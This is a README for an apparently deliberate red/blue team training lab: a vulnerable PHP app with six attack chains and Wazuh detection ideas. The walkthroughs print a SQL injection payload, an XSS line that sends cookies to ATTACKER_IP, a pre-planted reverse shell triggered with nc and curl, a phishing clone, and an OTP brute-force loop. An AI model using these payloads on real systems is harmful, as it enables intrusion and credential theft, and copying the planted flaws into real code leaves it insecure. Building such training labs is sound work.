# LogAcademy — Red/Blue Team Training Lab

An intentionally vulnerable PHP web application designed for hands-on red and blue team training. Students attack the application through 6 chained vulnerabilities, while blue teamers build detection rules in a SIEM (e.g. Wazuh) to identify and alert on each attack.

---

## Architecture

```
┌─────────────────────────────────┐
│         Same Subnet             │
│                                 │
│  ┌─────────────────┐            │
│  │   Web Server    │            │
│  │  (this repo)    │            │
│  │  Docker: web    │            │
│  │  + db           │            │
│  └────────┬────────┘            │
│           │ logs                │
│  ┌────────▼────────┐            │
│  │  Wazuh Server   │            │
│  │  (separate VM)  │            │
│  └─────────────────┘            │
└─────────────────────────────────┘
```

- **Web server instance**: runs this Docker Compose stack (Apache + PHP + MySQL)
- **Wazuh instance**: separate VM on the same subnet — collects logs, runs detection rules
- Two virtual hosts served on port 80:
  - `logacademy.local` — the student portal (vulnerable app)
  - `logportal.local` — fake phishing clone (Chain 5 target)

---

## Prerequisites

Install these on the web server instance before starting:

```bash
sudo apt update && sudo apt install -y docker.io docker-compose git
sudo usermod -aG docker $USER && newgrp docker
```

---

## Installation

### 1. Clone the repository

```bash
git clone https://github.com/Ahmadd018/logacademy.git
cd logacademy
```

### 2. Configure environment variables

```bash
cp .env.example .env
nano .env
```

Fill in the values:

| Variable | Description |
|---|---|
| `DOMAIN` | Main app domain (default: `logacademy.local`) |
| `FAKE_DOMAIN` | Phishing clone domain (default: `logportal.local`) |
| `DB_PASS` | MySQL user password |
| `DB_ROOT_PASS` | MySQL root password |
| `MAIL_USER` | Gmail address for OTP emails |
| `MAIL_PASS` | Gmail App Password (not your account password) |
| `MAIL_FROM` | Sender address for OTP emails |
| `ATTACKER_IP` | **Red team only** — your attacker machine IP (for the pre-planted reverse shell in Chain 4) |
| `ATTACKER_PORT` | **Red team only** — listener port (default: `1234`) |

> **Gmail App Password**: Go to your Google Account → Security → 2-Step Verification → App Passwords. Generate one for "Mail".

### 3. Add hosts entries

On **every machine** that will access the lab (browser, attacker box, etc.):

```bash
echo "YOUR_WEB_SERVER_IP  logacademy.local logportal.local" | sudo tee -a /etc/hosts
```

Replace `YOUR_WEB_SERVER_IP` with the actual IP of the web server VM.

> On **Windows**: edit `C:\Windows\System32\drivers\etc\hosts` as Administrator.

### 4. Start the lab

```bash
docker-compose up -d
```

Wait ~15 seconds for MySQL to initialise, then open:

- **Student portal**: http://logacademy.local
- **Admin panel**: http://logacademy.local/admin/login.php
- **Phishing clone**: http://logportal.local

### 5. Verify it's running

```bash
docker-compose ps        # both 'web' and 'db' should be Up
docker-compose logs web  # check for Apache errors
```

---

## Default Credentials

| Role | Username | Password |
|---|---|---|
| Student | `ahmad.aghamaliyev` | `password123` |
| Student | `aytac.huseynova` | `mypassword` |
| Student | `nicat.aliyev` | `nicat2024` |
| Admin | `superadmin` | `Admin@2024!` |

> OTP is sent to the user's email address on every login. For local testing, query the DB directly:
> ```bash
> docker-compose exec db mysql -u loguser -plogpass123 logacademy -e "SELECT * FROM otp_codes ORDER BY id DESC LIMIT 5;"
> ```

---

## Attack Chains

The application contains 6 intentional vulnerability chains. Each chain is a self-contained exercise.

### Chain 1 — SQL Injection → Admin Discovery
**Entry point**: `http://logacademy.local/search.php?q=`

The search query is concatenated directly into SQL. Use a UNION injection to enumerate `information_schema.tables` and find the hidden admin table, then extract credentials.

```
' UNION SELECT table_name,null,null,null FROM information_schema.tables WHERE table_name LIKE 'admin%'-- -
```

**Bonus**: The `/backup/` directory has directory listing enabled and contains a `.env` file with the admin password in plaintext.

---

### Chain 2 — Stored XSS → Admin Session Hijack
**Entry point**: `http://logacademy.local/messages.php`

Message bodies are stored without sanitisation and rendered without escaping in both the user inbox and the admin dashboard. Send an XSS payload to receiver `[ Admin ]` (ID 0). The payload fires when the admin opens their dashboard.

```html
<script>fetch('http://ATTACKER_IP/?c='+document.cookie)</script>
```

---

### Chain 3 — IDOR via Weak Token → Profile Enumeration
**Entry point**: `http://logacademy.local/profile/view.php?token=`

Profile tokens are just `base64(user_id:SECRET_KEY)`. The secret key is hardcoded as `edu_secret_2024` and is also **leaked in the client-side JavaScript** at `/js/profile.js`. There is no ownership check on the token.

```bash
echo -n "2:edu_secret_2024" | base64
# visit /profile/view.php?token=<result> to view user 2's profile
```

---

### Chain 4 — Unrestricted File Upload → Remote Code Execution
**Entry point**: `http://logacademy.local/documents/upload.php`

No file type or MIME validation. The uploads directory has an `.htaccess` that enables PHP execution. Upload a `.php` webshell and access it directly.

A reverse shell is pre-planted at `/uploads/php-reverse-shell.php`. It reads `ATTACKER_IP` and `ATTACKER_PORT` from environment variables. Set up a listener and trigger it:

```bash
nc -lvnp 1234
curl http://logacademy.local/uploads/php-reverse-shell.php
```

---

### Chain 5 — Open Redirect → Phishing
**Entry point**: `http://logacademy.local/redirect.php?url=`

The `url` parameter is passed directly to `header("Location: ...")` with no validation. Use it to redirect victims to `logportal.local` — a pixel-perfect fake login page that harvests credentials.

```
http://logacademy.local/redirect.php?url=http://logportal.local
```

---

### Chain 6 — OTP Bypass
**Entry point**: `http://logacademy.local/verify.php`

Multiple weaknesses stacked:
- 4-digit OTP → only 10,000 possibilities
- Old OTPs are **never deleted** — all previously issued codes remain valid
- No rate limiting on submission or resend (`?resend=1`)

Brute-force the OTP with a simple loop:

```bash
for i in $(seq -w 0 9999); do
  r=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://logacademy.local/verify.php \
    -b "PHPSESSID=YOUR_SESSION" -d "otp=$i")
  if [ "$r" = "302" ]; then echo "Valid OTP: $i"; break; fi
done
```

---

## Stopping the Lab

```bash
docker-compose down          # stop containers, keep DB data
docker-compose down -v       # stop and wipe DB (fresh start)
```

---

## Blue Team — Log Collection (Wazuh)

> Full Wazuh integration guide coming soon. The following is the intended setup.

1. Install the **Wazuh agent** on the web server VM and point it at your Wazuh manager IP
2. Configure the agent to ship Apache access/error logs:
   - `/var/log/apache2/logacademy_access.log`
   - `/var/log/apache2/logacademy_error.log`
3. Write custom Wazuh rules to detect each chain:
   - Chain 1: SQL keywords (`UNION`, `information_schema`) in GET/POST params
   - Chain 2: `<script>` tags in POST body to `/messages.php`
   - Chain 3: Repeated token variations to `/profile/view.php`
   - Chain 4: `.php` file uploads to `/documents/upload.php`
   - Chain 5: `redirect.php` requests with external `url=` values
   - Chain 6: Rapid repeated POST requests to `/verify.php`

---

## Project Structure

```
logacademy/
├── docker-compose.yml
├── .env.example              ← copy to .env and fill in
├── db/
│   └── init.sql              ← schema + seed data
└── web/
    ├── Dockerfile
    ├── php.ini
    ├── apache/
    │   ├── logacademy.conf   ← main vhost
    │   └── logportal.conf    ← phishing vhost
    └── html/
        ├── logacademy/       ← main vulnerable app
        │   ├── admin/        ← admin panel
        │   ├── backup/       ← exposed backup dir (Chain 1)
        │   ├── documents/    ← file upload (Chain 4)
        │   ├── includes/     ← config, header, footer
        │   ├── profile/      ← IDOR (Chain 3)
        │   ├── uploads/      ← uploaded files, PHP exec enabled (Chain 4)
        │   └── js/           ← leaks SECRET_KEY (Chain 3)
        └── logportal/        ← phishing clone (Chain 5)
```
